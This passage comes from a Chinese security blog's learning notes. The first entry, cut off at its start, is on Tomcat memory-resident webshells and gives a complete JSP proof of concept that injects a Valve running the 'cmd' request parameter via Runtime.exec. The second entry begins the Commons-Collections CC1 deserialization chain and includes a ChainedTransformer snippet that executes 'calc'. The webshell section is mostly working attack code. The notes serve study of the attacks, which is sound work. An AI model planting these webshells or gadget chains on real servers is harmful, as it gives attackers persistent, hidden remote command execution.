  wrapper.setServlet(shell_servlet);</span><br><span class="line">    wrapper.setServletClass(shell_servlet.getClass().getName());</span><br><span class="line">%&gt;</span><br><span class="line"> </span><br><span class="line">&lt;%</span><br><span class="line">    standardContext.addChild(wrapper);</span><br><span class="line">    standardContext.addServletMappingDecoded(<span class="string">&quot;/shell&quot;</span>,name);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>访问Servlet.jsp动态注册Servlet</p>
<p>访问对应路径的Servlet命令执行</p>
<p>Servlet型内存马的缺点就是必须要访问对应的路径才能命令执行，易被发现。</p>
<h4 id="什么是valve？"><a href="#什么是valve？" class="headerlink" title="什么是valve？"></a>什么是valve？</h4><p>在了解Valve之前，我们先来简单了解一下Tomcat中的<code>管道机制</code>。</p>
<p>我们知道，当Tomcat接收到客户端请求时，首先会使用<code>Connector</code>进行解析，然后发送到<code>Container</code>进行处理。那么我们的消息又是怎么在四类子容器中层层传递，最终送到Servlet进行处理的呢？这里涉及到的机制就是Tomcat管道机制。</p>
<p>管道机制主要涉及到两个名词，Pipeline（管道）和Valve（阀门）。如果我们把请求比作管道（Pipeline）中流动的水，那么阀门（Valve）就可以用来在管道中实现各种功能，如控制流速等。因此通过管道机制，我们能按照需求，给在不同子容器中流通的请求添加各种不同的业务逻辑，并提前在不同子容器中完成相应的逻辑操作。这里的调用流程可以类比为Filter中的责任链机制<img src="https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20220218104446.png" alt="img"></p>
<p>在Tomcat中，四大组件Engine、Host、Context以及Wrapper都有其对应的Valve类，StandardEngineValve、StandardHostValve、StandardContextValve以及StandardWrapperValve，他们同时维护一个StandardPipeline实例。</p>
<h4 id="管道机制流程分析"><a href="#管道机制流程分析" class="headerlink" title="管道机制流程分析"></a>管道机制流程分析</h4><p>我们先来看看Pipeline接口，继承了Contained接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Pipeline</span> <span class="keyword">extends</span> <span class="title class_">Contained</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> Valve <span class="title function_">getBasic</span><span class="params">()</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setBasic</span><span class="params">(Valve valve)</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addValve</span><span class="params">(Valve valve)</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> Valve[] getValves();</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">removeValve</span><span class="params">(Valve valve)</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">findNonAsyncValves</span><span class="params">(Set&lt;String&gt; result)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Pipeline接口提供了各种对Valve的操作方法，如我们可以通过<code>addValve()</code>方法来添加一个Valve。下面我们再来看看Valve接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Valve</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> Valve <span class="title function_">getNext</span><span class="params">()</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setNext</span><span class="params">(Valve valve)</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">backgroundProcess</span><span class="params">()</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ServletException;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isAsyncSupported</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中getNext()方法可以用来获取下一个Valve，Valve的调用过程可以理解成类似Filter中的责任链模式，按顺序调用。</p>
<p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E7%AE%A1%E9%81%93%E6%9C%BA%E5%88%B6.jpg" alt="img"></p>
<p>同时Valve可以通过重写<code>invoke()</code>方法来实现具体的业务逻辑</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Shell_Valve</span> <span class="keyword">extends</span> <span class="title class_">ValveBase</span> &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">            ...</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>下面我们通过源码看一看，消息在容器之间是如何传递的。首先消息传递到Connector被解析后，在<code>org.apache.catalina.connector.CoyoteAdapter#service</code>方法中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(org.apache.coyote.Request req, org.apache.coyote.Response res)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> (Request) req.getNote(ADAPTER_NOTES);</span><br><span class="line">        <span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> (Response) res.getNote(ADAPTER_NOTES);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (request == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// Create objects</span></span><br><span class="line">            request = connector.createRequest();</span><br><span class="line">            request.setCoyoteRequest(req);</span><br><span class="line">            response = connector.createResponse();</span><br><span class="line">            response.setCoyoteResponse(res);</span><br><span class="line"> </span><br><span class="line">            <span class="comment">// Link objects</span></span><br><span class="line">            request.setResponse(response);</span><br><span class="line">            response.setRequest(request);</span><br><span class="line"> </span><br><span class="line">            <span class="comment">// Set as notes</span></span><br><span class="line">            req.setNote(ADAPTER_NOTES, request);</span><br><span class="line">            res.setNote(ADAPTER_NOTES, response);</span><br><span class="line"> </span><br><span class="line">            <span class="comment">// Set query string encoding</span></span><br><span class="line">            req.getParameters().setQueryStringCharset(connector.getURICharset());</span><br><span class="line">        &#125;</span><br><span class="line">...</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">            ...</span><br><span class="line">            connector.getService().getContainer().getPipeline().getFirst().invoke(   request, response);</span><br><span class="line">            &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>前面是对Request和Respone对象进行一些判断及创建操作，我们重点来看一下<code>connector.getService().getContainer().getPipeline().getFirst().invoke(request, response)</code></p>
<p>首先通过<code>connector.getService()</code>来获取一个StandardService对象</p>
<p>接着通过<code>StandardService</code>.<code>getContainer().getPipeline()</code>获取<code>StandardPipeline</code>对象。</p>
<p>再通过<code>StandardPipeline.getFirst()</code>获取第一个Valve</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Valve <span class="title function_">getFirst</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (first != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> first;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> basic;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>最后通过调用<code>StandardEngineValve.invoke()</code>来实现Valve的各种业务逻辑</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// Select the Host to be used for this Request</span></span><br><span class="line">        <span class="type">Host</span> <span class="variable">host</span> <span class="operator">=</span> request.getHost();</span><br><span class="line">        <span class="keyword">if</span> (host == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// HTTP 0.9 or HTTP 1.0 request without a host when no default host</span></span><br><span class="line">            <span class="comment">// is defined.</span></span><br><span class="line">            <span class="comment">// Don&#x27;t overwrite an existing error</span></span><br><span class="line">            <span class="keyword">if</span> (!response.isError()) &#123;</span><br><span class="line">                response.sendError(<span class="number">404</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (request.isAsyncSupported()) &#123;</span><br><span class="line">            request.setAsyncSupported(host.getPipeline().isAsyncSupported());</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// Ask this Host to process this request</span></span><br><span class="line">        host.getPipeline().getFirst().invoke(request, response);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><code>host.getPipeline().getFirst().invoke(request, response)</code>实现调用后续的Valve。</p>
<h4 id="动态添加Valve"><a href="#动态添加Valve" class="headerlink" title="动态添加Valve"></a>动态添加Valve</h4><p>根据上文的分析我们能够总结出Valve型内存马的注入思路</p>
<ol>
<li>获取<code>StandardContext</code>对象</li>
<li>通过<code>StandardContext</code>对象获取<code>StandardPipeline</code></li>
<li>编写恶意Valve</li>
<li>通过<code>StandardPipeline.addValve()</code>动态添加Valve</li>
</ol>
<h5 id="获取StandardPipeline对象"><a href="#获取StandardPipeline对象" class="headerlink" title="获取StandardPipeline对象"></a>获取StandardPipeline对象</h5><figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    Field reqF <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>)<span class="comment">;</span></span><br><span class="line">    reqF.setAccessible(true)<span class="comment">;</span></span><br><span class="line">    Request req <span class="operator">=</span> (Request) reqF.get(request)<span class="comment">;</span></span><br><span class="line">    StandardContext standardContext <span class="operator">=</span> (StandardContext) req.getContext()<span class="comment">;</span></span><br><span class="line"> </span><br><span class="line">    Pipeline pipeline <span class="operator">=</span> standardContext.getPipeline()<span class="comment">;</span></span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<h5 id="编写恶意Valve类"><a href="#编写恶意Valve类" class="headerlink" title="编写恶意Valve类"></a>编写恶意Valve类</h5><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Shell_Valve</span> <span class="keyword">extends</span> <span class="title class_">ValveBase</span> &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (cmd !=<span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    Runtime.getRuntime().exec(cmd);</span><br><span class="line">                &#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;<span class="keyword">catch</span> (NullPointerException n)&#123;</span><br><span class="line">                    n.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<h5 id="将恶意Valve添加进StandardPipeline"><a href="#将恶意Valve添加进StandardPipeline" class="headerlink" title="将恶意Valve添加进StandardPipeline"></a>将恶意Valve添加进StandardPipeline</h5><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="type">Shell_Valve</span> <span class="variable">shell_valve</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Shell_Valve</span>();</span><br><span class="line">    pipeline.addValve(shell_valve);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<h4 id="完整POC-3"><a href="#完整POC-3" class="headerlink" title="完整POC"></a>完整POC</h4><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Pipeline&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.valves.ValveBase&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Response&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line"> </span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">Field</span> <span class="variable">reqF</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    reqF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) reqF.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br><span class="line"> </span><br><span class="line">    <span class="type">Pipeline</span> <span class="variable">pipeline</span> <span class="operator">=</span> standardContext.getPipeline();</span><br><span class="line">%&gt;</span><br><span class="line"> </span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Shell_Valve</span> <span class="keyword">extends</span> <span class="title class_">ValveBase</span> &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (cmd !=<span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    Runtime.getRuntime().exec(cmd);</span><br><span class="line">                &#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;<span class="keyword">catch</span> (NullPointerException n)&#123;</span><br><span class="line">                    n.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"> </span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">Shell_Valve</span> <span class="variable">shell_valve</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Shell_Valve</span>();</span><br><span class="line">    pipeline.addValve(shell_valve);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>访问Valve.jsp任意路径即可命令执行</p>
<p>后续也会学习怎么防御的持续更新</p>
<p>资料:<a href="https://goodapple.top/archives/1355">https://goodapple.top/archives/1355</a></p>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>cc链1</title>
    <url>/2023/07/10/cc1/</url>
    <content><![CDATA[<h1 id="前提知识点"><a href="#前提知识点" class="headerlink" title="前提知识点"></a>前提知识点</h1><h3 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h3><p><code>Proxy.newProxyInstance</code> 方法用于创建动态代理对象。它接受三个参数：</p>
<ol>
<li>ClassLoader：指定用于加载代理类的类加载器。</li>
<li>interfaces：指定代理类要实现的接口列表。</li>
<li>invocationHandler：指定代理类的调用处理程序，用于处理代理类的方法调用。</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">newProxyInstance</span><span class="params">(ClassLoader loader, Class&lt;?&gt;[] interfaces, InvocationHandler h)</span> <span class="keyword">throws</span> IllegalArgumentException</span><br></pre></td></tr></table></figure>

<p>InvocationHandler也是一个接口需要写出invoke方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span></span><br><span class="line">        <span class="keyword">throws</span> Throwable;</span><br></pre></td></tr></table></figure>

<p>当我们调用某个动态代理对象的方法时，都会触发代理类的invoke方法，并传递对应的内容。</p>
<p>已经学过反射了就不详写了环境要commons-collections : 3.1 TransformedMap - jdk &lt; 8u71</p>
<h3 id="AbstractMapDecorator"><a href="#AbstractMapDecorator" class="headerlink" title="AbstractMapDecorator"></a>AbstractMapDecorator</h3><p>首先 CC 库中提供了一个抽象类 <code>org.apache.commons.collections.map.AbstractMapDecorator</code>，这个类是 Map 的扩展，并且从名字中可以知道，这是一个基础的装饰器，用来给 map 提供附加功能，被装饰的 map 存在该类的属性中，并且将所有的操作都转发给这个 map。</p>
<p>这个类有很多实现类，各个类触发的方式不同，重点关注的是</p>
<p>它的子类 TransformedMap 以及 LazyMap。</p>
<h4 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h4><p><code>org.apache.commons.collections.map.TransformedMap</code> 类可以在一个元素被加入到集合内时，自动对该元素进行特定的修饰变换，具体的变换逻辑由 Transformer 来定义，Transformer 在 TransformedMap 实例化时作为参数传入。也就是说当 TransformedMap 内的 key 或者 value 发生变化时（例如调用 TransformedMap 的 <code>put</code> 方法时），就会触发相应参数的 Transformer 的 <code>transform()</code> 方法。</p>
<h4 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h4><p><code>org.apache.commons.collections.map.LazyMap</code> 与 TransformedMap 类似，不过差异是调用 <code>get()</code> 方法时如果传入的 key 不存在，则会触发相应参数的 Transformer 的 <code>transform()</code> 方法。</p>
<p>与 LazyMap 具有相同功能的，是 <code>org.apache.commons.collections.map.DefaultedMap</code>，同样是 <code>get()</code> 方法会触发 transform 方法。</p>
<h3 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h3><p><code>org.apache.commons.collections.Transformer</code> 是一个接口，提供了一个 <code>transform()</code> 方法，用来定义具体的转换逻辑。方法接收 Object 类型的 input，处理后将 Object 返回。</p>
<p>在 Commons Collection 3.2.1 中，程序提供了 14 个 Transformer 的实现类，用来实现不同的对 TransformedMap 中 key&#x2F;value 进行修改的功能。</p>
<p>重点关注其中几个实现类。</p>
<h4 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h4><p>这个实现类从 Commons Collections 3.0 引入，功能是使用反射创建一个新对象，我们来看一下它的 transfrom 方法，方法注释写的很清楚，通过反射调用 input 的方法，并将方法返回结果作为处理结果进行返回。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="comment">//构造函数,也可以传一个参数,也没什么</span></span><br><span class="line">   <span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.iMethodName = methodName;</span><br><span class="line">        <span class="built_in">this</span>.iParamTypes = paramTypes;</span><br><span class="line">        <span class="built_in">this</span>.iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">//transform方法</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">                <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="built_in">this</span>.iMethodName, <span class="built_in">this</span>.iParamTypes);</span><br><span class="line">                <span class="keyword">return</span> method.invoke(input, <span class="built_in">this</span>.iArgs);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchMethodException var5) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IllegalAccessException var6) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InvocationTargetException var7) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, var7);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分析为什么用了input (传进去对象) 的什么方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="built_in">this</span>.iMethodName,<span class="built_in">this</span>.iParamTypes);</span><br><span class="line"><span class="keyword">return</span> method.invoke(input, <span class="built_in">this</span>.iArgs);</span><br></pre></td></tr></table></figure>

<p>发现通过反射获取可以构造函数初始化的变量方法,（iMethodName）和对应的类型,（iParamTypes）</p>
<p>构造函数初始化的传入参数（iArgs）作为方法执行的参数</p>
<h4 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h4><p>其transform方法将输入原封不动的返回：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//构造函数</span></span><br><span class="line"><span class="comment">//private final Object iConstant;</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.iConstant = constantToReturn;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//transform方法</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>不管传入的objec是什么都会返回本来的构造函数设置的对象</p>
<h4 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h4><p>其transform方法实现了对每个传入的transformer都调用其transform方法，并将结果作为下一次的输入传递进去：</p>
<p>上一次返回的object作为下一个参数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// private final Transformer[] iTransformers; </span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="built_in">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">            object = <span class="built_in">this</span>.iTransformers[i].transform(object);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Runtime类的对象能使用方法exec()来命令执行，但是Runtime类的构造方法是私有的所以可以获取类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Runtime <span class="title function_">getRuntime</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> currentRuntime;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Runtime</span> <span class="variable">currentRuntime</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Runtime</span>();</span><br></pre></td></tr></table></figure>

<p>由这三个transformer组合起来，即可实现任意命令执行：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc1</span> &#123;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">          <span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                  <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                  <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                          String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">                          <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                  <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                          Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">                          <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                  <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                          <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)&#125;);</span><br><span class="line">          chain.transform(<span class="number">123</span>);</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分析:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">入口点是chain.transform(123);进入ChainedTransformer类transform方法怎么用的看上面 传入123</span></span><br><span class="line"><span class="comment">第一个transformer对象是 ConstantTransformer 传入123也只会返回 Runtime.class</span></span><br><span class="line"><span class="comment">第二个transformer对象是 InvokerTransformer  传入Runtime.class作为input 所以使用了Runtime.class.getMethod方法 参数是 getRuntime 和一个null(后面再说) 所以返回了 Menthod Runtime.getRuntime</span></span><br><span class="line"><span class="comment">第三个transformer对象是 InvokerTransformer  传入Menthod Runtime.getRuntime 所以使用了 Menthod的invoke方法学反射时候就已经学了menthod.invoke(object,args)(因为是静态static所以null) 所以使用了方法 getRuntime()返回了一个Runtime的对象了</span></span><br><span class="line"><span class="comment">第三个transformer对象是 InvokerTransformer  传入Runtime对象 所以使用了Runtime.exec()方法 参数是是calc</span></span><br></pre></td></tr></table></figure>



